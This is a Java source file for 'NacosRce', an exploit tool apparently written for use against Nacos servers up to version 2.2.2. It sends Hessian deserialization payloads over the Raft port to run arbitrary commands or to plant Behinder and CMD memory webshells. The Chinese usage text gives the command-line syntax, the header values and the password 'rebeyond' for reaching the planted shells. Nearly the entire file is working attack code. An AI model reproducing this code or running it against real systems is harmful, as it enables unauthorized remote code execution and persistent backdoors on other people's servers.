package com.nacostools.rce;


import com.alibaba.nacos.consistency.entity.HessianPayload;
import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.google.protobuf.ByteString;



import java.io.*;

import java.lang.reflect.Field;

import java.util.concurrent.ConcurrentHashMap;


public class NacosRce {

    private final static boolean isDebug = false;
    public static void main(String[] args) throws Exception {

        System.err.println("\n" +
                "  _   _                     ____          \n" +
                " | \\ | | __ _  ___ ___  ___|  _ \\ ___ ___ \n" +
                " |  \\| |/ _` |/ __/ _ \\/ __| |_) / __/ _ \\\n" +
                " | |\\  | (_| | (_| (_) \\__ \\  _ < (_|  __/\n" +
                " |_| \\_|\\__,_|\\___\\___/|___/_| \\_\\___\\___|\n" +
                "                                          \n");
        String mod = "xslt";
        String addr = "";
        String cmd = "";

        if (args.length != 2) {
            printUsage();
            if (isDebug){
                addr = "192.168.90.1:7848";
                cmd = "open -a qq.app";
            }else {
                System.exit(0);
            }


        }else {
            addr = args[0];
            cmd = args[1];
        }

        Object hashMap0 = null;
        Object hashMap1 = null;

        if("xslt".equals(mod)){
            if("memshell".equals(cmd)){
                hashMap0 =  HessianPayload.genPayloadOfXslt("memshell");
            }else {
                hashMap0 =  HessianPayload.genPayloadOfXslt("cmd:"+cmd);
            }
            hashMap1 =  HessianPayload.genPayloadOfXslt("run");
        }else if("bcel".equals(mod)){
            //未经测试
            hashMap0 = HessianPayload.genPayloadOfBcel();
        }



        //构造metadata
        MetadataOperation mo0 = new MetadataOperation<>();

        mo0.obj0 = hashMap0;
        mo0.obj1 = hashMap1;
        ByteArrayOutputStream baos0 = getByteArrayOutputStream(mo0);

        try {
            sendPayload(addr,baos0.toByteArray());
        }catch (Exception e){
            System.out.println(e);
        }

    }







    private static ByteArrayOutputStream getByteArrayOutputStream(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
//        output.getSerializerFactory().setAllowNonSerializable(true);

        try {
            SerializerFactory serializerFactory = output.getSerializerFactory();
            serializerFactory.setAllowNonSerializable(true);
            output.writeObject(obj);
            output.flushBuffer();
        }catch (Exception e){
            System.err.println(e);
        }


        return baos;
    }

    public static void sendPayload(String addr,byte[] payload) throws Exception{

        //节点标识信息
        //发请求
        Configuration conf = new Configuration();
        conf.parse(addr);
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        PeerId leader = PeerId.parsePeer(addr);

        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());

        //payload绑定到writeRequest中
//        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service_v2").setData(ByteString.copyFrom(payload)).build();
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_service_metadata").setData(ByteString.copyFrom(payload)).build();
//        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_instance_metadata").setData(ByteString.copyFrom(payload)).build();
         //发送
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
//        System.out.println(o.toString());

    }
    private static void printUsage() {
        System.err.println("Nacos Hessian 反序列化漏洞利用工具 v0.2");
        System.err.println("Author: 刨洞安全 && 凉风");
        System.err.println("** 食用方式 **");
        System.err.println("执行无回显命令\tjava -jar NacosRce.jar ip:port \"[command]\"");
        System.err.println("同时注入冰蝎&&CMD内存马[推荐]\tjava -jar NacosRce.jar ip:port memshell");
        System.err.println("冰蝎内存马使用方法：\n1、需要设置请求头x-client-data:rebeyond\n2、设置Referer:https://www.google.com/\n3、路径随意\n4、密码rebeyond");
        System.err.println("CMD内存马使用方法：\n1、需要设置请求头x-client-data:cmd\n2、设置Referer:https://www.google.com/\n3、请求头cmd:要执行的命令");
        System.err.println();
        System.err.println("v0.2版本实现了：");
        System.err.println("1、不出网漏洞利用");
        System.err.println("2、可多次发起漏洞利用");
        System.err.println("3、注入冰蝎/CMD内存马");
        System.err.println("tips:\n1、请用jdk1.8\n2、适用于 Nacos 2.x <= 2.2.2\n3、非集群的也能打哦");
        System.err.println();


    }

}
